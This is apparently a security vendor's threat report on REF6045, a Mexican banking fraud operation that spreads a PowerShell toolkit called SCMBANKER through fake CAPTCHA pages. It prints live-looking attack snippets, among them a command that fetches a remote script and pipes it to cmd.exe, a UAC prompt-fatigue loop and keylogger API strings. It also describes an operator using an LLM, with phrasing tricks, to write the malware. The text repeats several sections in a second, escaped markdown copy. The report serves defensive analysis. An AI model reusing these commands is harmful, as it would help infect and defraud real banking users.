class="flex lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><p>A Mexican banking fraud operation we&#x27;re tracking as REF6045 doesn&#x27;t run on autopilot. A human operator is behind the wheel, monitoring infected machines and deciding what happens next. Victims are infected through fake CAPTCHA pages that trick them into running a single command, which installs SCMBANKER, a PowerShell toolkit with components dating back to at least October 2025. Once installed, the operator can see when a victim opens a banking session, lock the screen behind a fake bank warning, push the victims towards live phone interaction, redirect the browser, or replace account numbers copied to the clipboard. For a full takeover, they can also deploy a commercial remote-access tool.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="key-takeaways" class="absolute -top-32"></span>Key takeaways</h2>
<ul>
<li>REF6045 adapts ClickFix delivery into operator-assisted banking fraud, using fake verification pages to stage a PowerShell toolkit (we’re calling SCMBANKER) on victim machines</li>
<li>SCMBANKER gives operators a full fraud workflow: banking-session monitoring, screenshot capture, vishing overlays, phishing redirects, clipboard manipulation, and Remote Utilities installation</li>
<li>SCMBANKER heavily targets Mexico’s financial ecosystem, including retail banks, business banking portals, fintechs, payment processors, cryptocurrency exchanges, investment platforms, SAT, and telecom services</li>
<li>Operator OPSEC failures, including open directories, a leaked web-root archive, and an unauthenticated file editor, expose the operation’s tooling and targeting logic</li>
<li>The scripts are riddled with AI-generated artifacts, indicating that the operator used an LLM to write most of the tooling</li>
</ul>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="how-elastic-security-labs-discovered-ref6045" class="absolute -top-32"></span>How Elastic Security Labs discovered REF6045</h2>
<p>On June 18, 2026, Elastic telemetry surfaced a host using <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/bitsadmin">bitsadmin</a> to download a batch of suspicious PowerShell scripts from an open directory at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">http://68.211.161[.]46/files/</code>. The open directory allowed us to retrieve the individual agent scripts directly, and from the same server, we recovered an archive, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">zkt.zip</code>, containing the operation&#x27;s full web root before it was removed.</p>
<p></p>
<p>At the web root of <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">http://68.211.161[.]46/</code>, we found a ClickFix fake-CAPTCHA flow that presented itself as a security verification page. The page first asked the visitor to complete an image challenge, including a Spanish prompt to select fire hydrants, before moving into the familiar Windows Run verification instructions. The command fetches <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">validation.txt</code> from the same web server and pipes it directly into <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">cmd.exe</code>, using the lure text “Google Verificación Segura (Version 2025.5755)”. The page also sends a POST request to a tracking endpoint at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">https://ww.ssinvestigaciones[.]com/login3.php</code>.</p>
<p></p>
<p>Because <a href="https://developer.mozilla.org/en-US/docs/Web/API/Clipboard/writeText"><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">navigator.clipboard.writeText()</code></a> requires a secure, focused browser context to copy the malicious command to the victim&#x27;s clipboard, the original IP (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">http://68.211.161[.]46/</code>) was unlikely to be the only victim-facing delivery path. We identified multiple HTTPS ClickFix hosts that reused the same command pattern and pointed victims back to the exposed file servers for <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">validation.txt</code>.</p>

<h2 class="font-bold text-2xl md:text-4xl relative"><span id="scmbankers-execution-chain" class="absolute -top-32"></span>SCMBANKER&#x27;s execution chain</h2>
<p></p>
<p>The initial infection chain described below uses the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">monteviral2026.duckdns[.]org</code> ClickFix page as an example, but the observed variants follow the same pattern: they present a CAPTCHA-style verification page, including an image challenge, before copying a command to the clipboard and instructing the victim to run it from the Windows Run dialog.</p>
<p>Below is an example command line:</p>
<pre><code>cmd /c curl -k http://68.211.161[.]46/validation.txt | cmd.exe &amp; exit #                                                     CIoudfIare            Google Verificación Segura (Version 2025.5755)</code></pre>
<p>Decoy strings &quot;CIoudfIare&quot; with capital-I homoglyphs, and the &quot;Google Verificación Segura&quot; version text are reproduced verbatim.</p>
<p></p>
<p>Despite the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.txt</code> extension, it is a Windows batch script that prepares the host and sets up the full toolkit in six different stages.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="fake-update-smokescreen" class="absolute -top-32"></span>Fake update smokescreen</h3>
<p>The batch script immediately launches Microsoft Edge in <a href="https://learn.microsoft.com/en-us/deployedge/microsoft-edge-configure-kiosk-mode#overview">kiosk mode</a> pointing to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">fakeupdate[.]net</code>, a well-known pentesting/red team site that renders a fake Windows Update screen. This distraction buys time for the script to fully execute.</p>
<pre><code>start msedge.exe --kiosk https://fakeupdate[.]net/win10ue --edge-kiosk-type=fullscreen</code></pre>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="uac-consent-fatigue-loop" class="absolute -top-32"></span>UAC consent fatigue loop</h3>
<p>Next, the malware checks if it is running as admin via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">net session</code>. If it is not elevated, it shows a social-engineered message &quot;Windows: Se requieren permisos de administrador para actualizar su sistema...&quot; (Administrator permissions are required to update your system…), and relaunches itself with <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">-Verb RunAs</code> every 20 seconds, frustrating and forcing the victim to click “Yes” on the UAC consent prompt.</p>
<pre><code>:check
net session &gt;nul 2&gt;&amp;1
if %errorlevel%==0 goto admin
echo Windows: Se requieren permisos de administrador para actualizar su sistema...
powershell -Command &quot;Start-Process &#x27;%~f0&#x27; -Verb RunAs&quot;
timeout /t 20 &gt;nul
goto check</code></pre>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="cursor-trap" class="absolute -top-32"></span>Cursor trap</h3>
<p>Once elevated, an inline PowerShell P/Invoke call to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">user32.dll!ClipCursor</code> confines the mouse to a single 1x1 pixel rectangle at the screen center, locking any mouse movement. This is paired with the fake Windows Update screen to encourage the victim to stay idle, giving time for the malware to download the full toolset in the background without interruption.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="downloading-the-scmbanker-toolkit-via-bitsadmin" class="absolute -top-32"></span>Downloading the SCMBANKER toolkit via bitsadmin</h3>
<p>All malicious scripts, files, and binaries are pulled individually via <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">bitsadmin</code> from <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">http://68.211.161[.]46/files/</code> to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">C:\Users\Public\</code>.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="scmbankers-persistence-registry-run-key-and-startup-folder" class="absolute -top-32"></span>SCMBANKER&#x27;s persistence: registry Run key and startup folder</h3>
<p>Two persistence mechanisms launched by <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">C:\Users\Public\run.vbs</code> on logon, plus a one-shot infection marker:</p>
<ul>
<li><strong>Run key</strong>: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">HKCU\...\Run</code>, value <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">&quot;run&quot;</code>, runs hidden PowerShell launching <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">run.vbs</code>.</li>
<li><strong>Startup folder</strong>: <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">run.vbs</code> dropped to three path variants (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%APPDATA%</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%USERPROFILE%\AppData\Roaming</code>, and the legacy XP <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">%USERPROFILE%\Start Menu</code>).</li>

<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="forcing-a-reboot-to-trigger-persistence" class="absolute -top-32"></span>Forcing a reboot to trigger persistence</h3>
<p>The script sends an F11 keypress to exit fullscreen, followed by a Ctrl+W keypress sequence to close the fake Windows Update tab. However, this approach only works in a standard fullscreen browser window, not in kiosk mode. It then forces a reboot with the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">shutdown /r /t 02</code> command and switches. Upon restart, the previous persistence mechanism via the Registry Run key triggers execution of the VBScript file (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">run.vbs</code>).</p>

<p>Every script opens with heavy banner-comment dividers (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">INTERVALOS DE TIEMPO</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">DICCIONARIOS Y VARIABLES</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">FUNCIONES</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">INICIO</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">LOOP PRINCIPAL</code>). This document-like scaffolding is a hallmark of LLM-generated PowerShell and is rarely seen in scripts by experienced developers.</p>
<p>Taken together, the evidence points to an operator who prompted a model in Spanish, used profanity and phrasing tricks either out of frustration or to bypass safety filters for the more sensitive components, and pasted the outputs with little review before applying a light manual obfuscation pass. The kit was not generated autonomously, but the model did the heavy lifting on essentially every functional script.</p>
<p>As language models become increasingly capable, defenders should expect AI-assisted malware development to become more common, particularly among operators who previously lacked the expertise to implement these capabilities themselves.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="ref6045s-infrastructure-and-opsec-failures" class="absolute -top-32"></span>REF6045&#x27;s infrastructure and OPSEC failures</h2>
<p>The depth of this analysis was made possible by poor server hygiene across the operation. The file server at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">http://68.211.161[.]46/files/</code> had directory listing enabled, exposing the PowerShell agent scripts for direct download. The same directory also briefly hosted <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">zkt.zip</code>, which yielded the entire operation in a single archive.</p>
<p></p>
<p>The C2 also exposed an unauthenticated file editor at <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/b/editor.php</code>, allowing anyone to directly modify the operation&#x27;s live targeting configuration files without credentials. The same surface that lets the operator manage victims also lets a visitor read and write the configuration files.</p>
<p></p>
<p>The related hosts listed in Discovery reused the same <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">validation.txt</code> delivery pattern while hosting overlapping PowerShell toolsets under <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">/files</code>. Those hosted scripts pointed to separate C2 panels, but the panels shared the same SCM-branded login template, with the latest we’ve seen being SCM v2.0, hence the name SCMBANKER.</p>
<p></p>
<p>Taken together, the open directories, exposed editor, repeated lure text, overlapping file-server contents, and shared SCM panel branding suggest kit reuse or multiple deployments by the same operator set. We treat the related hosts as infrastructure variants around the same tooling rather than as separate malware families.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="why-ref6045-matters-despite-its-crude-execution" class="absolute -top-32"></span>Why REF6045 matters despite its crude execution</h2>
<p>REF6045 is not a sophisticated operation. The tooling is crude and held together with copy-paste batch files, duplicated bitsadmin jobs, sloppy persistence, self-defeating obfuscation that ships its own key, and a server left wide open with directory listings, a full web-root archive, and an unauthenticated editing panel.</p>
<p>That lack of craftsmanship is partly explained by how the kit was developed. The scripts are littered with numerous AI-generated artifacts, suggesting the operator relied heavily on a large language model to implement much of the functionality. Rather than writing components such as the keylogger or a clipboard hijacker from scratch, the operator prompted a model, pasted the output, and applied a light manual obfuscation pass on top.</p>
<p>Victims are kept as a passive feed while the operator watches a live dashboard and engages only the targets worth the effort, switching on browser redirects, vishing lockdowns, clipboard swaps, or a full RAT by IP, on demand. Crude as it is, SCMBANKER already has real victims. The live victim counter and the labeled, tagged machines on the operator&#x27;s own panels show that individual people are being actively targeted.</p>

The code has a split personality, with clean, descriptive function names and heavy explanatory comments sitting next to hand-shortened variables and leftover generation artifacts. The placement of instruction-like comments directly above the code they describe suggests the authors have prompted an inline coding assistant such as Copilot or Cursor.\n\nThe clearest artifact is a comment sitting directly in the mutation rotator and the keylogger (`rotor2.ps1` and `key.ps1`), which are saturated with aggressive profanity in their comments, while the rest of the kit uses a neutral tone:\n\n![AI-generated comments in SCMBANKER's rotor2.ps1 script revealing LLM-written malware](/assets/images/mexican-banking-fraud-scmbanker-ref6045/image11.png \"AI-generated comments in SCMBANKER's rotor2.ps1 script revealing LLM-written malware\")  \n\n`key.ps1` has a self-documenting obfuscation; Base64-encodes its Win32 API names to hide them from scanners, then immediately annotates what each one decodes to:\n\n```\n$u32b64  = 'dXNlcjMyLmRsbA=='          # user32.dll\n$GASb64  = 'R2V0QXN5bmNLZXlTdGF0ZQ=='  # GetAsyncKeyState\n$GKLb64  = 'R2V0S2V5Ym9hcmRMYXlvdXQ='  # GetKeyboardLayout\n$TUExb64 = 'VG9Vbmljb2RlRXg='          # ToUnicodeEx\n```\n\nEvery script opens with heavy banner-comment dividers (`INTERVALOS DE TIEMPO`, `DICCIONARIOS Y VARIABLES`, `FUNCIONES`, `INICIO`, `LOOP PRINCIPAL`). This document-like scaffolding is a hallmark of LLM-generated PowerShell and is rarely seen in scripts by experienced developers.\n\nTaken together, the evidence points to an operator who prompted a model in Spanish, used profanity and phrasing tricks either out of frustration or to bypass safety filters for the more sensitive components, and pasted the outputs with little review before applying a light manual obfuscation pass. The kit was not generated autonomously, but the model did the heavy lifting on essentially every functional script. \n\nAs language models become increasingly capable, defenders should expect AI-assisted malware development to become more common, particularly among operators who previously lacked the expertise to implement these capabilities themselves. \n\n## REF6045's infrastructure and OPSEC failures\n\nThe depth of this analysis was made possible by poor server hygiene across the operation. The file server at `http://68.211.161[.]46/files/` had directory listing enabled, exposing the PowerShell agent scripts for direct download. The same directory also briefly hosted `zkt.zip`, which yielded the entire operation in a single archive.\n\n![Open directory listing exposing SCMBANKER's PowerShell toolkit files for download](/assets/images/mexican-banking-fraud-scmbanker-ref6045/image22.png \"Open directory listing exposing SCMBANKER's PowerShell toolkit files for download\")  \n\nThe C2 also exposed an unauthenticated file editor at `/b/editor.php`, allowing anyone to directly modify the operation's live targeting configuration files without credentials. The same surface that lets the operator manage victims also lets a visitor read and write the configuration files.\n\n![Unauthenticated REF6045 file editor exposing live banking fraud targeting configuration](/assets/images/mexican-banking-fraud-scmbanker-ref6045/image5.png \"Unauthenticated REF6045 file editor exposing live banking fraud targeting configuration\")  \n\nThe related hosts listed in Discovery reused the same `validation.txt` delivery pattern while hosting overlapping PowerShell toolsets under `/files`. Those hosted scripts pointed to separate C2 panels, but the panels shared the same SCM-branded login template, with the latest we’ve seen being SCM v2.0, hence the name SCMBANKER.\n\n![Three REF6045 command-and-control panels sharing the same SCM banking fraud login template](/assets/images/mexican-banking-fraud-scmbanker-ref6045/image2.png \"Three REF6045 command-and-control panels sharing the same SCM banking fraud login template\")  \n\nTaken together, the open directories, exposed editor, repeated lure text, overlapping file-server contents, and shared SCM panel branding suggest kit reuse or multiple deployments by the same operator set. We treat the related hosts as infrastructure variants around the same tooling rather than as separate malware families.\n\n## Why REF6045 matters despite its crude execution\n\nREF6045 is not a sophisticated operation. The tooling is crude and held together with copy-paste batch files, duplicated bitsadmin jobs, sloppy persistence, self-defeating obfuscation that ships its own key, and a server left wide open with directory listings, a full web-root archive, and an unauthenticated editing panel.\n\nThat lack of craftsmanship is partly explained by how the kit was developed. The scripts are littered with numerous AI-generated artifacts, suggesting the operator relied heavily on a large language model to implement much of the functionality. Rather than writing components such as the keylogger or a clipboard hijacker from scratch, the operator prompted a model, pasted the output, and applied a light manual obfuscation pass on top.\n\nVictims are kept as a passive feed while the operator watches a live dashboard and engages only the targets worth the effort, switching on browser redirects, vishing lockdowns, clipboard swaps, or a full RAT by IP, on demand. Crude as it is, SCMBANKER already has real victims. The live victim counter and the labeled, tagged machines on the operator's own panels show that individual people are being actively targeted.\n\n## REF6045 through MITRE ATT\u0026CK\n\nElastic uses the [MITRE ATT\u0026CK](https://attack.mitre.org/) framework to document common tactics, techniques, and procedures that threats use against enterprise networks.\n\n### Tactics\n\nTactics represent the why of a technique or sub-technique.
